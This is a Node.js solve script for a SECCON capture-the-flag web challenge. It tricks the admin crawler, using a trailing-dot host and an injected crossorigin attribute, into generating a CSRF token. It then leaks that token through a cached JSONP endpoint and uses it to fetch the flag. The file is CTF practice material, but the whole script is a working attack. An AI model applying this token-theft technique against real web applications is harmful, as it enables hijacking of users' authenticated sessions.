const axios = require('axios').default;
const qs = require('qs');


const BASE_URL = 'https://milk-revenge.chal.seccon.jp';
const API_BASE_URL = 'https://milk-revenge-api.chal.seccon.jp';


async function solve() {
  if (process.argv.length <= 2) {
    console.log("Provide cache key");
    return;
  }
  const cacheKey = process.argv[2];
  // Make admin generate and fetch csrf token.
  // Becareful to make the admin crawler
  // NOT to consume the csrf token by adding a `.` in the FQDN.
  // By appending a `.` at the end of FQDN, the `<script src=...`
  // will become access to a different origin, and thus the credential (i.e., cookie)
  // will not be sent by default.
  // Force the `<script src=...` to send cookies by appending `crossorigin=use-credentials`.
  const genTokenRes = await axios.post(
    `${BASE_URL}/report`,
    qs.stringify({
      url: `${BASE_URL}./note.php?id=thisisid&_=${cacheKey} crossorigin=use-credentials`}),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      }
    },
  );
  console.log(genTokenRes.data);

  const t = await new Promise((resolve) => { setTimeout(resolve, 5000) });

  // Use the same `_` parameter to leak admin's csrf token
  const param = qs.stringify({ _: cacheKey });
  const jsonpScriptRes = await axios.get(
    `${API_BASE_URL}/csrf-token?${param}`,
  );
  const jsonpScript = jsonpScriptRes.data;
  const token = jsonpScript.match(/\('([a-z0-9-]*)'\)/)[1];
  console.log(token);
  // Access flag with admin's csrf token

  const flagParam = qs.stringify({ token });
  const flagRes = await axios.get(
    `${API_BASE_URL}/notes/flag?${flagParam}`,
    {
      headers: {
        Referer: 'https://milk-revenge.chal.seccon.jp/',
      }
    }
  );
  const flag = flagRes.data;
  console.log(flag);
}


solve();
